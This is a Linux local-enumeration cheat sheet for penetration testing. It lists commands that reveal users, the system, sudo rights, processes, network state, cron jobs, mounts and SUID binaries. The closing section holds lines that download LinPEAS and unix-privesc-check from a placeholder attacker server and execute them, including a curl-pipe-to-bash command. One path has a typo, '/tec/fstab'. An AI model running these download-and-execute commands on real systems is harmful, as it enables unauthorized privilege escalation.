# Local Enumeration

### Users

Enumerate the current user ID (UID), group ID (GID), and the groups the user belongs to.

```bash
id
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo) # john's result
```

Enumerate basic information of all users using `/etc/passwd`.

```bash
cat /etc/passwd
```

The following example describes a line of `/etc/passwd` file.

```bash
john:x:1001:1001:John Doe:/home/john:/bin/bash
username:password:uid:gid:gecos:home directory:shell
```

* **Username**: The login name (1-32 characters).
* **Password**: An `x` means the password is stored in `/etc/shadow`.
* **User ID (UID)**: Unique ID for the user. UID 0 is for root, 1-99 are reserved, and 100-999 are for system accounts.
* **Group ID (GID)**: The primary group ID, found in `/etc/group`.
* **User Info (GECOS)**: Optional user information like full name or contact info.
* **Home Directory**: The user's default directory when logging in.
* **Shell**: The user's default shell, like `/bin/bash`, or `/sbin/nologin` to prevent login.

### System information

Enumerate hostname.

```bash
hostname
```

Enumerate operating system version.

```bash
cat /etc/issue
```

```bash
cat /etc/os-release
```

Enumerate kernel version and architecture.

```bash
uname -a
```

### User configurations

list `sudoer` capabilities of current user.

```bash
sudo -l
```

List environment variables.

```bash
env
```

List config files such as bash profile.

```bash
ls -la <home_directory>
```

### Processes

Enumerate all processes in a user readable format.

```bash
ps aux
```

Monitor Processes.

```bash
watch -n 1 "ps -aux | grep pass"
```

It also possible to monitor running processes at live time using [pspy](https://github.com/DominicBreuker/pspy) tool.

### Network

Enumerate all network interfaces, this includes physical and virtual networks.

```bash
ip a
```

```bash
ifconfig
```

Display the routing tables.

```bash
route
```

Enumerate connections.

```bash
ss -anp
```

```bash
netstat -tulnp
```

Enumerate firewall rules.

```bash
cat /etc/iptables/rules.v4
```

### Scheduled tasks

Scheduled tasks in Linux also known as "Cron Jobs" and configured using the `crontab` command-line tool.

#### Crontab Files

* **User-specific crontabs**: Stored separately for each user and managed by the `crontab` command.
* **System-wide crontab**: Found in `/etc/crontab`. This file allows specifying jobs for different users.
* **Cron directories**:
  * `/etc/cron.hourly`: Tasks that run every hour.
  * `/etc/cron.daily`: Tasks that run daily.
  * `/etc/cron.weekly`: Tasks that run weekly.
  * `/etc/cron.monthly`: Tasks that run monthly.

Listing tasks files.

```bash
ls -lah /etc/cron*
```

Find tasks in the system logs.

```bash
grep "CRON" /var/log/syslog
```

Enumerate the current user's scheduled jobs.

```bash
crontab -l
```

### Application

Listing installed applications.

```bash
dpkg -l
```

### File System

List all drives at boot time.

```bash
cat /tec/fstab
```

List all mounted file systems.

```bash
mount
```

List all available disks.

```bash
lsblk
```

Enumerate loaded Kernel modules.

```bash
lsmod
```

Gather more information about the kernel module.

```bash
/sbin/modinfo <module>
```

### SUID Binaries

Enumerate SUID binaries.

```bash
find / -perm /4000 -type f 2>/dev/null
```

## Automated Enumeration

Download and execute **`LinPEAS`** or **`unix-privesc-check`:**

{% code overflow="wrap" %}
```bash
# LinPEAS
curl -L http://<attacker_http_server>/linpeas.sh | bash 

# unix-privesc-check
wget http://<attacker_http_server>/unix-privesc-check && chmod +x unix-privesc-check && ./unix-privesc-check <standard | detailed> 
```
{% endcode %}
